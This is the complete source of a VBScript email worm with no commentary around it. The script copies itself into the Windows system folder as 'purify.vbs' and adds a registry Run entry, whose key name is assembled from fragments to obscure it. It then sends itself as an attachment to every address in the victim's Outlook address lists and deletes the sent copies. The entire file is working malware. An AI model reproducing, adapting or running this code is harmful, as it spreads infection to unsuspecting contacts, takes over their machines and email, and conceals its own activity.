On Error Resume Next
Dim kl, kg, kh, ka, kq, ii, iio, pp, po, pi, pu, py
Set ii = CreateObject("Scripting.FileSystemObject")
Set iio = CreateObject("WScript.Shell")
Set kl = CreateObject("Outlook.Application")
Set kg = kl.GetNameSpace("MAPI")
pi = "purify.vbs"
po = ii.BuildPath(ii.GetSpecialFolder(1), pi)
ii.CopyFile WScript.ScriptFullName, po
pu = "HKEY" & "_" & "L" & "O" & "C" & "A" & "L" & "_"
py = "Microsoft\"
iio.RegWrite pu & "MACHINE\" & "Software\" & py & "Windows\" & "Current" & "Version" & "\" & "Run" & "Serv" & "ices\" & pi, po
For Each kh In kg.AddressLists
For ka = 1 To kh.AddressEntries.Count
Set kq = kl.CreateItem(0)
kq.BCC = kh.AddressEntries(ka).Address
kq.Subject = "Something givin' has no value"
kq.Body = "There is something rotten in the modern lifestyle.

Let's all go back to sticks."
kq.Attachments.Add WScript.ScriptFullName
kq.DeleteAfterSubmit = True
kq.Send
Next
Next
po = ""